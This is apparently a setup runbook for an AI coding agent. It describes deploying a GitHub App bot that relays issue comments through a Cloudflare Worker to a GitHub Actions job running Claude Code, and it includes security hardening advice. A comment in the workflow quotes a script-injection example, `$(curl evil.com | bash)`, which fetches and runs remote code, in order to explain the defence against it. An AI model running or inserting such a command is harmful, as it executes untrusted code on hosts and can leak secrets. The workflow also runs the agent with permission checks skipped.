# Runbook: Wire up `@the-intern-bot` (GitHub App → Worker → Actions dispatcher)

This is an execution runbook for an agent (e.g. Claude Code) to build the pieces of
this pipeline that *can* be automated. A few steps are marked **HUMAN** — those
require a browser click by design (GitHub won't let this be scripted) and should
be confirmed with the user, not attempted by the agent.

Target end state: someone comments `@the-intern-bot claude fix this` on an issue or PR
→ GitHub webhook → Cloudflare Worker relay → `repository_dispatch` → Actions
workflow in `agent-infra` → Claude Code runs a **fresh session** (no `--resume`)
→ result posted back as `the-intern-bot[bot]`.

Continuity across triggers on the same issue/PR is handled by committed session
summaries (see section 5 and "Session summaries" below), not by resuming
conversation state — this trades some re-derivation cost per run for simpler,
bounded, auditable state.

---

## 0. Prerequisites checklist (confirm before starting)

- [ ] **HUMAN** — GitHub App already created (name, permissions, webhook section
      present even if URL is a placeholder). Confirm you have:
  - App ID
  - Private key (`.pem` file, downloaded once)
  - Webhook secret (set when the webhook section was configured)
- [ ] **HUMAN** — App installed on both the target repo(s) and `agent-infra`.
- [ ] `agent-infra` repo exists and the agent has push access to it.
- [ ] `CLAUDE_CODE_OAUTH_TOKEN` obtained locally via `claude setup-token`.
- [ ] A Cloudflare account, with an API Token created (Workers Edit permission)
      and Account ID noted — see step 5.

If any of these are missing, stop and get them first — everything below assumes
they exist.

---

## 1. Secrets inventory

Store all of these in `agent-infra`'s repo secrets (Settings → Secrets and
variables → Actions) **and** as Cloudflare Worker secrets where noted. Never
commit any of these to a file that gets pushed.

| Name | Used by | Notes |
|---|---|---|
| `APP_ID` | Worker, Actions | GitHub App ID (not sensitive, but keep consistent) |
| `APP_PRIVATE_KEY` | Worker, Actions | Full contents of the `.pem` file |
| `WEBHOOK_SECRET` | Worker only | Used to verify `X-Hub-Signature-256` |
| `CLAUDE_CODE_OAUTH_TOKEN` | Actions | From `claude setup-token` |
| `CODEX_API_KEY` | Actions | OpenAI Platform API key, used by `codex exec` when a trigger comment specifies `backend=codex`. Metered API billing, not ChatGPT-plan usage — see the "Plan-limits vs API-billing auth" note on issue #3 for why |
| `BOT_LOGIN` | Worker | e.g. `the-intern-bot[bot]` — used to drop self-triggered events |
| `ALLOWED_USERS` | Worker only | Comma-separated GitHub usernames permitted to trigger the bot — set to just your own login |
| `CLOUDFLARE_API_TOKEN` | agent's shell / CI deploying the Worker | Not used at runtime by the Worker itself |
| `CLOUDFLARE_ACCOUNT_ID` | same as above | |

---

## 2. Create a sandbox repo for testing

Before wiring anything else up, the agent should create a dedicated throwaway
repo to test against, rather than any real project:

```bash
gh repo create the-intern-sandbox --private --description "Sandbox for testing the-intern-bot end to end" --clone
cd the-intern-sandbox
echo "# the-intern-sandbox" > README.md
git add . && git commit -m "init" && git push
```

Seed it with a couple of trivial things worth having on hand for testing:

- A small file with an obvious, easy bug (agent can "fix" it convincingly and
  quickly during verification).
- A basic CI workflow that runs something trivial (e.g. a lint or a one-line
  test) — needed later to test the `check_suite` / CI-failure-wakeup flow.
- A branch protection rule on `main` requiring PR review before merge (test
  the "bot can never merge" guarantee here too, not just in real repos).

- [ ] **HUMAN** — install the GitHub App on `the-intern-sandbox` (same
      one-time consent click as any other repo installation).

All steps in section 8 (end-to-end verification) should be run against
`the-intern-sandbox` first. Only point the pipeline at real target repos once
verification passes cleanly here.

---

## 3. `agent-infra` repo structure

```
agent-infra/
├── .github/workflows/
│   └── dispatcher.yml
├── scripts/
│   ├── mint-installation-token.js
│   └── run-agent.sh
└── worker/
    ├── src/index.js
    ├── wrangler.toml
    └── package.json
```

---

## 4. Installation-token minting script (shared by Worker and Actions)

`scripts/mint-installation-token.js` — Node, no dependencies beyond `jsonwebtoken`:

```javascript
// scripts/mint-installation-token.js
const jwt = require('jsonwebtoken');

async function getInstallationToken({ appId, privateKey, installationId }) {
  const now = Math.floor(Date.now() / 1000);
  const appJwt = jwt.sign(
    { iat: now - 60, exp: now + 600, iss: appId },
    privateKey,
    { algorithm: 'RS256' }
  );

  const res = await fetch(
    `https://api.github.com/app/installations/${installationId}/access_tokens`,
    {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${appJwt}`,
        Accept: 'application/vnd.github+json',
      },
    }
  );
  if (!res.ok) throw new Error(`Token mint failed: ${res.status} ${await res.text()}`);
  const data = await res.json();
  return data.token; // valid ~1 hour
}

module.exports = { getInstallationToken };
```

To find `installationId` for a given repo, call:
`GET /repos/{owner}/{repo}/installation` (authenticated as the App via its JWT) —
do this once per repo and hardcode/store the resulting IDs, they don't change.

---

## 5. Cloudflare Worker (thin relay)

`worker/wrangler.toml`:

```toml
name = "the-intern-bot-relay"
main = "src/index.js"
compatibility_date = "2026-01-01"

[vars]
# non-secret vars only here; secrets go in via `wrangler secret put`
```

`worker/src/index.js`:

```javascript
export default {
  async fetch(request, env) {
    if (request.method !== 'POST') return new Response('ok', { status: 200 });

    const body = await request.text();
    const signature = request.headers.get('X-Hub-Signature-256') || '';
    const valid = await verifySignature(body, signature, env.WEBHOOK_SECRET);
    if (!valid) return new Response('bad signature', { status: 401 });

    const eventType = request.headers.get('X-GitHub-Event');
    const payload = JSON.parse(body);

    // Only YOU should be able to trigger the bot — not other collaborators,
    // not org members, not anyone else. Gate on exact username, not on
    // author_association (OWNER/MEMBER/COLLABORATOR would still admit other
    // people with repo access). ALLOWED_USERS is a comma-separated allowlist
    // Worker secret — set it to just your own login unless you deliberately
    // want to add someone else later.
    const author = payload.comment?.user?.login || payload.review?.user?.login;
    const allowed = (env.ALLOWED_USERS || '').split(',').map(s => s.trim()).filter(Boolean);
    if (!author || !allowed.includes(author)) {
      return new Response('ignored: author not in allowlist', { status: 200 });
    }

    // self-comment guard is now redundant given the allowlist above (the bot's
    // own login shouldn't be in ALLOWED_USERS), but kept as defense-in-depth
    // in case of misconfiguration
    if (author === env.BOT_LOGIN) {
      return new Response('ignored: self-comment', { status: 200 });
    }

    // only forward events we actually care about
    const relevant = ['issue_comment', 'pull_request_review', 'pull_request_review_comment', 'check_suite'];
    if (!relevant.includes(eventType)) return new Response('ignored: event type', { status: 200 });

    const installationId = payload.installation?.id;
    const token = await getInstallationToken(env, installationId);

    const dispatchRes = await fetch(
      `https://api.github.com/repos/${env.AGENT_INFRA_OWNER}/${env.AGENT_INFRA_REPO}/dispatches`,
      {
        method: 'POST',
        headers: {
          Authorization: `Bearer ${token}`,
          Accept: 'application/vnd.github+json',
        },
        body: JSON.stringify({
          event_type: eventType,
          client_payload: { raw: payload },
        }),
      }
    );

    if (!dispatchRes.ok) {
      return new Response(`dispatch failed: ${await dispatchRes.text()}`, { status: 502 });
    }
    return new Response('ok', { status: 200 });
  },
};

async function verifySignature(body, signatureHeader, secret) {
  if (!signatureHeader.startsWith('sha256=')) return false;
  const encoder = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw', encoder.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
  );
  const mac = await crypto.subtle.sign('HMAC', key, encoder.encode(body));
  const expected = 'sha256=' + [...new Uint8Array(mac)].map(b => b.toString(16).padStart(2, '0')).join('');
  // constant-time-ish compare
  if (expected.length !== signatureHeader.length) return false;
  let diff = 0;
  for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ signatureHeader.charCodeAt(i);
  return diff === 0;
}

async function getInstallationToken(env, installationId) {
  // Reimplemented inline for Workers (no Node crypto/jsonwebtoken available) —
  // sign a JWT with Web Crypto using env.APP_PRIVATE_KEY (PKCS8 PEM) and env.APP_ID,
  // then POST to /app/installations/{id}/access_tokens as in section 3.
  // (Kept as a stub here — mirror the logic from scripts/mint-installation-token.js,
  // adapted to Web Crypto's `crypto.subtle.importKey`/`sign` with RS256.)
  throw new Error('implement JWT signing with Web Crypto here');
}
```

> **Agent note:** the Node `jsonwebtoken` library won't run as-is in the Workers
> runtime. Either (a) reimplement the JWT signing step with `crypto.subtle`
> (RS256, PKCS8 key import), or (b) use an npm package that's Workers-compatible
> (e.g. `@tsndr/cloudflare-worker-jwt`) and bundle it via `wrangler`'s built-in
> esbuild support. Don't try to `require('jsonwebtoken')` directly in the Worker.

Deploy (agent runs this with `CLOUDFLARE_API_TOKEN`/`CLOUDFLARE_ACCOUNT_ID` in env):

```bash
cd worker
npm install
wrangler secret put WEBHOOK_SECRET <<< "$WEBHOOK_SECRET"
wrangler secret put APP_ID <<< "$APP_ID"
wrangler secret put APP_PRIVATE_KEY <<< "$APP_PRIVATE_KEY"
wrangler secret put BOT_LOGIN <<< "the-intern-bot[bot]"
wrangler secret put ALLOWED_USERS <<< "your-github-username"
wrangler deploy
```

Capture the resulting `*.workers.dev` URL (or custom domain if configured) — you need it for step 7.

---

## 6. GitHub Actions dispatcher (`agent-infra`)

`.github/workflows/dispatcher.yml`:

```yaml
name: the-intern-bot dispatcher
on:
  repository_dispatch:
    types: [issue_comment, pull_request_review, pull_request_review_comment, check_suite]
  workflow_dispatch:
    inputs:
      target_repo: { required: true }
      pr_number: { required: true }
      comment_body: { required: true }

jobs:
  handle:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Parse trigger and extract backend/model/effort
        id: parse
        run: |
          # Read either the real webhook payload (github.event.client_payload.raw)
          # or the manual workflow_dispatch inputs, extract:
          #   - comment/review body text
          #   - target repo (owner/name)
          #   - issue/PR number
          #   - backend keyword (claude/codex/agy), model, effort — default from
          #     .github/agent-config.yml in the target repo if unspecified
          echo "backend=claude" >> "$GITHUB_OUTPUT"   # placeholder logic

      - name: Mint installation token
        id: token
        run: node scripts/mint-installation-token.js
        env:
          APP_ID: ${{ secrets.APP_ID }}
          APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}

      - name: Checkout target repo
        uses: actions/checkout@v4
        with:
          repository: ${{ steps.parse.outputs.target_repo }}
          token: ${{ steps.token.outputs.token }}
          path: target

      - name: Run Claude (fresh session every trigger)
        working-directory: target
        env:
          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
          # Untrusted, attacker-influenced text MUST come in via env, never
          # interpolated directly into the `run:` block — direct interpolation
          # of ${{ }} expressions containing arbitrary comment text is a
          # classic GitHub Actions script-injection vector (e.g. a comment
          # containing `$(curl evil.com | bash)` would execute on the runner
          # if interpolated as a raw string). Env vars are passed as-is,
          # not shell-expanded.
          COMMENT_BODY: ${{ steps.parse.outputs.comment_body }}
        run: |
          # No --resume: every @the-intern-bot comment starts a brand-new session.
          # Continuity across triggers comes from the agent reading prior summary
          # docs (see "Session summaries" below), not from resumed conversation state.
          claude -p "$COMMENT_BODY" \
            --output-format json --dangerously-skip-permissions > result.json
          jq -r '.result' result.json > ../comment_body.txt

      - name: Post result back
        run: |
          gh pr comment ${{ steps.parse.outputs.issue_number }} \
            --repo ${{ steps.parse.outputs.target_repo }} \
            --body-file comment_body.txt
        env:
          GH_TOKEN: ${{ steps.token.outputs.token }}

      - name: Commit session summary to agent-infra (placeholder)
        working-directory: agent-infra   # the checkout of this repo itself, not `target`
        run: |
          # TODO: once summary-writing instructions are added to the agent's
          # prompt, this step should:
          #   1. create/checkout a branch like `summaries/<target_repo>/<issue_or_pr_number>`
          #   2. write the agent's summary (from result.json, or a dedicated
          #      summary file the agent is instructed to produce) to e.g.
          #      `summaries/<target_repo>/<number>/<timestamp>.md`
          #   3. commit and push that branch (not main — keep summaries off
          #      the default branch history)
          # The next trigger on the same issue/PR should read the latest
          # summary from that branch before running, so it can be included
          # in the prompt as prior context instead of a resumed session.
          echo "summary-commit step not yet implemented"
```

> **Agent note:** the parsing step is deliberately left as a placeholder —
> fill in real extraction logic once you know the exact payload shapes for
> `issue_comment` vs `pull_request_review` vs `pull_request_review_comment`
> vs `check_suite` (they differ). Write this as a small Node/Python script
> rather than inline bash once it's non-trivial.

---

## 7. Wire the webhook URL back into the App — **HUMAN**

- Go to the GitHub App settings → Webhook → set **Webhook URL** to the
  deployed Worker URL from step 4.
- Check **Active**.
- Save.
- From "Advanced" tab, redeliver any queued/failed test pings if you want to
  confirm connectivity immediately rather than waiting for a real comment.

---

## 8. End-to-end verification steps

Run all of this against `the-intern-sandbox` first — do not point at a real
repo until these all pass cleanly.

1. Comment `@the-intern-bot claude say hi` on a test issue in
   `the-intern-sandbox`.
2. Confirm in the App's "Advanced" tab that a delivery was sent and returned
   `200`.
3. Confirm a new run appears in `agent-infra`'s Actions tab, triggered by
   `repository_dispatch`.
4. Confirm the run completes and a comment appears on the original issue,
   authored by `the-intern-bot[bot]`.
5. Comment again on the same issue and confirm a **new** session starts each
   time (no `--resume` in the logs) — once the summary-commit step is
   implemented, also confirm the second run's prompt includes context pulled
   from the first run's committed summary.
6. Test the self-comment guard: confirm the bot's own reply comment does
   **not** trigger a second run.
7. Test the allowlist itself: have a second account (or a colleague, or a
   throwaway test account) comment `@the-intern-bot` on the sandbox and
   confirm nothing happens — only your own account's comment should ever
   trigger a run.
8. Have the bot open a PR against `the-intern-sandbox`'s seeded bug, then
   attempt (via the API, using the bot's own installation token) to merge
   it directly — confirm branch protection blocks this even though the
   token technically has PR write access.
9. Break the sandbox's seeded CI check on that PR and confirm the
   `check_suite` webhook fires a run that reacts to the failure.

---

## Session summaries (replaces resume-based continuity)

Each run is a fresh `claude -p` invocation — no `--resume`. To carry context
across separate triggers on the same issue/PR:

1. The agent's prompt (added later) should instruct it to end each session by
   writing a short summary of what it did/decided/found, as a markdown file.
2. That summary gets committed to a dedicated branch in `agent-infra`, e.g.
   `summaries/<owner>-<repo>/<issue_or_pr_number>`, not `main` — keeps this
   noise out of the default branch history entirely.
3. Before running, the dispatcher should check for an existing summary branch
   for this issue/PR, and if found, read the latest summary file and prepend
   it to the prompt as prior context (e.g. "Previous work on this: <summary>.
   New request: <comment_body>").
4. If a PR is abandoned and a second PR later addresses the same issue,
   decide deliberately whether the second attempt should inherit the first
   summary or start clean — don't default to blindly reusing stale context.

This is the placeholder step added in section 6 — not yet implemented.

## 9. Security hardening for a public `agent-infra`

Since this repo is public (for unmetered Actions minutes), tighten these
specifically — most are one-time setup, not ongoing effort:

- **Script injection (fixed above)** — any untrusted text (comment bodies,
  review text, issue titles) that reaches a `run:` step must go through
  `env:` first, never direct `${{ }}` interpolation into the shell string.
  Audit every workflow step for this pattern before going live, not just the
  ones shown in this runbook.

- **Username allowlist (fixed above, in the Worker)** — required, and
  deliberately stricter than typical "collaborators only" gating: only your
  exact GitHub login can trigger the bot, full stop. Anyone else — including
  other collaborators, org members, or the public if target repos are public
  — commenting `@the-intern-bot` gets silently ignored. Double check
  `ALLOWED_USERS` only ever contains your own username unless you make a
  deliberate, explicit decision to add someone else.

- **Never let the summary-commit step write anything secret.** Since summary
  branches live in this public repo, treat every file written there as
  permanently public the moment it's pushed — git history on a public repo
  is effectively unrecoverable once pushed, even after a force-push/delete
  (crawlers, forks, and caches can retain it). The summary content should be
  Claude's own prose about what it did — never raw command output, raw env
  dumps, or anything that could echo a token/key if something upstream
  misbehaves. Sanity-check the summary-writing prompt for this once it's
  written.

- **Don't upload debug artifacts.** Artifacts on a public repo's workflow
  runs are downloadable by anyone with read access — i.e. everyone. Avoid
  `actions/upload-artifact` for anything containing full webhook payloads,
  raw API responses, or logs, unless you've specifically reviewed it for
  secrets first.

- **Disable step debug logging** (`ACTIONS_STEP_DEBUG` / re-run with debug
  logging) as a default — it can surface more internal detail than normal
  logging, and GitHub's secret-masking is a string match, not guaranteed
  bulletproof against every possible encoding/transformation of a secret.

- **Pin third-party Actions to a commit SHA, not a tag**, e.g.
  `uses: actions/checkout@<full-sha>` instead of `@v4`. Tags are mutable —
  a compromised or hijacked Action could be swapped under a tag you already
  trust. This matters more on a public, higher-visibility repo. Anthropic's
  own `anthropics/claude-code-action` and standard `actions/*` are low-risk
  but pinning is cheap insurance either way.

- **Consider a GitHub Environment with required reviewers** for the job
  that actually holds `CLAUDE_CODE_OAUTH_TOKEN` and `APP_PRIVATE_KEY` —
  this adds a manual-approval gate before those secrets are ever exposed to
  a run, as defense-in-depth on top of the Worker's own signature
  verification and author-association check. Optional, but worth it given
  this repo is the credential root for everything else.

- **Don't accept external contributions (issues/PRs) to `agent-infra` itself
  without review.** It doesn't currently trigger anything off its own
  issue/PR comments (only `repository_dispatch`/`workflow_dispatch`), so
  there's no automatic risk there — but a merged malicious PR (e.g. a
  poisoned `package.json` dependency in the Worker's `npm install` step)
  would run with your secrets available. Keep branch protection on
  `agent-infra`'s own `main` too, same as any target repo.

---

## Known gaps to fill in later (not blocking initial setup)

- **Summary-write-and-commit logic** (see above) — the actual instructions
  telling the agent what to include in a summary, and the git plumbing to
  create/push the branch, are not yet written.
- Backend/model/effort parsing logic (section 6) is a stub — implement per
  the `@the-intern-bot backend model=... effort=...` syntax you settled on.
- Branch protection on target repos should already require review before
  merge — confirm the bot's token/account isn't exempted from that rule.
- Workflows permission on the App should remain **No access** unless you've
  deliberately decided otherwise (see prior discussion on blast radius).
- Telegram polling integration (if wanted) is a separate workflow, not part
  of this runbook.
